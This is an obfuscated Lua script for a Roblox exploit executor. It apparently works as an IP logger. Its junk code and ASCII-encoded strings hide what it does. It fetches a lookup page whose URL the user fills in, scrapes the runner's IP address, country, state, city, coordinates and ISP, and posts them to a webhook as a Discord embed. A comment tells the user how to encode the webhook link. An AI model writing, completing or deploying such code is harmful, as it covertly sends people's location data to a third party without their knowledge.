local function _Xy9Z(...)
    local _Pq3R = {...}
    local _Mk8L = {}
    for _Tn2W, _Vb5F in ipairs(_Pq3R[1]) do
        _Mk8L[_Tn2W] = string.char(_Vb5F)
        if math.random() > 0.5 then
            local _Fj7U = "qwertyuiopasdfghjklzxcvbnm"..tostring(_Vb5F * math.random(1,100))
            _Fj7U = _Fj7U:sub(1, #_Fj7U - 2)
        end
    end
    return table.concat(_Mk8L)
end

local _Rf4T = {
    _Xy9Z({webhook link in ASCII}), --dont forget to comma each letter
}

for _ = 1, 3 do
    local _Wp6K = math.random(100,999)
    _Wp6K = _Wp6K + 1
    _Wp6K = _Wp6K - 1
end

local function _Qw2E()
    local _Ns8P = table.concat({_Rf4T[1], _Rf4T[2], _Rf4T[3]}, "|")
    do
        local _Lk3M = false
        while not _Lk3M do
            _Lk3M = true
        end
    end
    return _Ns8P
end
local _Gh5Y = clonefunction(_Qw2E)

local function _Bv7C(...)
    local _Yt9N = {...}
    local _Df2K = string.split(_Gh5Y(), "|")
    local _Jh4D = _G[_Df2K[1]] or syn and syn.request or request
    local _Kp8L = _Df2K[2]
    local _Zr1M = _Df2K[3]

    local _Xq6P = _Jh4D({
        Url = _Kp8L,
        Method = _Xy9Z({71,69,84}),
        Headers = {[_Xy9Z({67,111,110,116,101,110,116,45,84,121,112,101})] = _Xy9Z({97,112,112,108,105,99,97,116,105,111,110,47,106,115,111,110})}
    })

    if _Xq6P.Success then
        local _Hn3V = _Xq6P.Body
        local function _Tk7F(text)
            local _Pm4Q = text:gsub(_Xy9Z({94,37,115,42,40,46,45,41,37,115,42,36}), _Xy9Z({37,49}))
            for i = 1, 5 do
                _Pm4Q = _Pm4Q:gsub("  ", " ")
            end
            return _Pm4Q:gsub(_Xy9Z({37,115,43}), " ")
        end

        local _Vc8R = {}
        for _Fs9W, _Gt5X in _Hn3V:gmatch(_Xy9Z({60,116,104,62,40,46,45,41,60,47,116,104,62,37,115,42,60,116,100,62,40,46,45,41,60,47,116,100,62})) do
            local _Bq3N = _Tk7F(_Fs9W:gsub(_Xy9Z({60,91,94,62,93,43,62}), ""):gsub(_Xy9Z({58}), ""))
            local _Np6L = _Tk7F(_Gt5X:gsub(_Xy9Z({60,91,94,62,93,43,62}), ""))
            _Vc8R[_Bq3N] = _Np6L
            if math.random() > 0.8 then
                local _Uj2K = _Bq3N:reverse()
                _Uj2K = nil
            end
        end

        local _Wm9Q = {
            title = _Xy9Z({84,69,83,84}),
            color = 5814783,
            fields = {
                {name = _Xy9Z({73,80}), value = _Vc8R[_Xy9Z({73,80})] or _Xy9Z({78,47,65}), inline = true},
                {name = _Xy9Z({67,111,117,110,116,114,121}), value = _Vc8R[_Xy9Z({67,111,117,110,116,114,121})] or _Xy9Z({78,47,65}), inline = true},
                {name = _Xy9Z({83,116,97,116,101}), value = _Vc8R[_Xy9Z({83,116,97,116,101})] or _Xy9Z({78,47,65}), inline = true},
                {name = _Xy9Z({67,105,116,121}), value = _Vc8R[_Xy9Z({67,105,116,121})] or _Xy9Z({78,47,65}), inline = true},
                {name = _Xy9Z({67,111,111,114,100,105,110,97,116,101,115}), value = (_Vc8R[_Xy9Z({76,97,116,105,116,117,100,101})] or _Xy9Z({78,47,65}))..", "..(_Vc8R[_Xy9Z({76,111,110,103,105,116,117,100,101})] or _Xy9Z({78,47,65})), inline = true},
                {name = _Xy9Z({73,83,80}), value = _Vc8R[_Xy9Z({73,83,80})] or _Xy9Z({78,47,65}), inline = false}
            },
            timestamp = os.date(_Xy9Z({33,37,89,45,37,109,45,37,100,84,37,72,58,37,77,58,37,83,90}))
        }

        do
            local _Cv3B = math.pi
            _Cv3B = tostring(_Cv3B):sub(1,5)
        end

        _Jh4D({
            Url = _Zr1M,
            Method = _Xy9Z({80,79,83,84}),
            Headers = {[_Xy9Z({67,111,110,116,101,110,116,45,84,121,112,101})] = _Xy9Z({97,112,112,108,105,99,97,116,105,111,110,47,106,115,111,110})},
            Body = game:GetService(_Xy9Z({72,116,116,112,83,101,114,118,105,99,101})):JSONEncode({embeds = {_Wm9Q}})
        })
    end
end

local _Sd1P = clonefunction(_Bv7C)
_Sd1P()
